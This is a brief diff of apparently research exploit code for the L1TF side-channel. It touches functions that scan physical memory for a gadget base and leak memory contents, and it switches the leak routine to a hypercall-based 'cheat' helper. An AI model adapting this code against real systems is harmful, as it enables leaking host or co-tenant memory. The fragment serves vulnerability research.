@@ -957,8 +957,8 @@ uintptr_t l1tf_find_page_pa(void *p)
 uintptr_t l1tf_find_base(void)
 {
   const int verbose = 1;
-	pr_dub("\nl1tf_find_base()\n" HLINE);
-  pr_dub("Searching through all %luGB of physical memory for gadget's base address...\n", HOST_MEMORY_SIZE >> 30);
+	fprintf(stderr, "\nl1tf_find_base()\n" HLINE);
+  pr_dub("Searching through all %luGB of physical memory at page granularity for gadget's base address...\n", HOST_MEMORY_SIZE >> 30);
 
 #if HELPERS
   uintptr_t real_pa = helper_base_pa();
@@ -1167,7 +1167,7 @@ void l1tf_leak_cheat_wrapper(char *data, uintptr_t base, uintptr_t pa, uintptr_t
 {
 #if LEAK == CHEAT || LEAK == CHEAT_NOISY
     u64 *buf = malloc(len + 8);
-    for (int off = 0; off < len; off += 8)
+    for (u64 off = 0; off < len; off += 8)
             buf[off/8] = hc_read_pa(pa+off);
     memcpy(data, buf, len);
   #if LEAK == CHEAT_NOISY
@@ -1187,7 +1187,7 @@ void l1tf_leak(char *data, uintptr_t base, uintptr_t pa, uintptr_t len)
   if (verbose) fprintf(stderr, "\n");
 
   if (!confidently_cached(pa, len))
-    _l1tf_leak(data, base, pa, len);
+    l1tf_leak_cheat_wrapper(data, base, pa, len);
   else
     l1tf_cached += len;
 
